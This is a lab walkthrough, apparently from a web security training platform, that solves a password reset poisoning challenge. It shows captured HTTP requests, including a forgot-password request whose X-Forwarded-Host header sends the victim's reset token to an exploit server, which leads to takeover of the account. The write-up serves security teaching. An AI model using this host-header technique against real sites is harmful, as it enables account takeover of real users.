# Lab 13: Password reset poisoning via middleware

## Description

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

---

## Solution

Login with the credentials `wiener:peter` and intercept the login request in case it's useful later.

```http
POST /login HTTP/1.1
Host: aca41f571ec54bf580676d8100ae00e8.web-security-academy.net
Cookie: session=2NuLDGBnqy2BwlWPTe1RSqel5O5hpynT
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net
Dnt: 1
Referer: https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=wiener&password=peter
```

After successfully logging in, an account screen is rendered that displays the current user's email address along with the option to update the user account's email address.

Log back out and return to the login page. This time, choose the `Forgot Password?` option. A prompt to enter the username or email address is rendered. Enter the username `wiener` and intercept the request.

```http
POST /forgot-password HTTP/1.1
Host: aca41f571ec54bf580676d8100ae00e8.web-security-academy.net
Cookie: session=aod71FWtnKgcfwfw1ujobk49D6nQNylf
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net
Dnt: 1
Referer: https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=wiener
```

Navigate to `wiener`'s email client. An email has been generated with the following password reset link: `https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net/forgot-password?temp-forgot-password-token=3RjFx6ZFZYxNThvrOYl4hd0iZ7SwEV5A`. The token appears to be fairly random and not merely an encoded blob of user account data (i.e., `base64(username)`). Follow the link to be taken to a new form to change the password.

Submit the form with `peter` as the new password and intercept the request.

```http
POST /forgot-password?temp-forgot-password-token=3RjFx6ZFZYxNThvrOYl4hd0iZ7SwEV5A HTTP/1.1
Host: aca41f571ec54bf580676d8100ae00e8.web-security-academy.net
Cookie: session=aod71FWtnKgcfwfw1ujobk49D6nQNylf
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net
Dnt: 1
Referer: https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net/forgot-password?temp-forgot-password-token=3RjFx6ZFZYxNThvrOYl4hd0iZ7SwEV5A
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

temp-forgot-password-token=3RjFx6ZFZYxNThvrOYl4hd0iZ7SwEV5A&new-password-1=peter&new-password-2=peter
```

A successful password change yields a 302 redirect to `/`.

So far, this challenge is the same as [12 - Password reset broken logic](12%20-%20Password%20reset%20broken%20logic.md). However, the backend of this challenge doesn't simply check whether the token parameter exists and then change `username`'s password. The vulnerability is in the way the password reset link is generated during in the `POST /forgot-password` endpoint.

This endpoint is sensitive to the fact that it may be behind a reverse proxy. If it is, then its hostname probably isn't routable to the client and thus would be useless in the password reset link. Instead, it should use the same hostname the client was attempting to access when it made its request to the reverse proxy. This is indicated by the `X-Forwarded-Host` header.

By submitting a `POST` request to `/forgot-password` with the username `carlos` and the `X-Forwarded-Host` header set to the hostname of the challenge's exploit server, the endpont will send an email with the following link: `https://$X_FORWARDED_HOST/forgot-password?temp-forgot-forgot-password-token=$TOKEN`. When `carlos` clicks on this link, he will unknowingly send a request with his password reset token to the exploit server.

```http
POST /forgot-password HTTP/1.1
Host: aca41f571ec54bf580676d8100ae00e8.web-security-academy.net
Cookie: session=aod71FWtnKgcfwfw1ujobk49D6nQNylf
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net
Dnt: 1
Referer: https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
X-Forwarded-Host: exploit-ac421ff71e034b6880656dd8013c00d3.web-security-academy.net

username=carlos
```

Retrieve the password change token from the exploit server's access logs.

![](images/Pasted%20image%2020210814171941.png)

Browse to `https://aca41f571ec54bf580676d8100ae00e8.web-security-academy.net/forgot-password?temp-forgot-password-token=NiX6Rq9cwjXBF8wWEj4T3A46q2Qf4nlL` and change `carlos`'s password. Login as `carlos` to complete the challenge.
